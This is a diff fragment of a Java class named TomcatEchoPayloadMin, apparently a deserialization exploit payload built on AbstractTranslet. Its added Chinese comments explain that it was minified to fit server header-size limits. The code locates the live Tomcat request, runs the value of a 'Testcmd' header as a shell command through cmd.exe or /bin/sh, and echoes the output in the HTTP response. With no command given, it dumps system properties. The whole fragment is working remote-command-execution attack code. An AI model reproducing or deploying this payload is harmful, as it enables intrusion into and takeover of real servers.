@@ -11,6 +11,8 @@ import java.io.Serializable;
 /**
  * @author m01e
  * @since 2022/9/3
+ * 去掉代码中不必要的符号，修改一些变量名、方法名，
+ * 从而缩小序列化后的数据大小，因为中间件对请求头大小有限制的，不能过大.
  */
 public class TomcatEchoPayloadMin extends AbstractTranslet implements Serializable {
     public TomcatEchoPayloadMin() throws Exception{transletVersion=101;Object o;Object resp;String s;boolean done=false;Thread[] ts=(Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");for (int i = 0; i < ts.length; i++) {Thread t = ts[i];if (t == null) {continue;}s = t.getName();if (!s.contains("exec") && s.contains("http")){o=getFV(t, "target");if (!(o instanceof Runnable)) {continue;}try {o = getFV(getFV(getFV(o, "this$0"), "handler"), "global");} catch (Exception e) {continue;}java.util.List ps = (java.util.List) getFV(o, "processors");for (int j = 0; j < ps.size(); j++) {Object p = ps.get(j);o = getFV(p, "req");resp = o.getClass().getMethod("getResponse", new Class[0]).invoke(o, new Object[0]);s = (String) o.getClass().getMethod("getHeader",new Class[]{String.class}).invoke(o,new Object[]{"Testcmd"});if(s!=null&&!s.isEmpty()){resp.getClass().getMethod("setStatus",new Class[]{int.class}).invoke(resp,new Object[]{new Integer(200)});String[] cmd=System.getProperty("os.name").toLowerCase().contains("window")?new String[]{"cmd.exe","/c",s}:new String[]{"/bin/sh", "-c", s};wb(resp,new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes());done=true;}if((s==null||s.isEmpty())&&done){wb(resp,System.getProperties().toString().getBytes());}if(done){break;}}if(done){break;}}}}
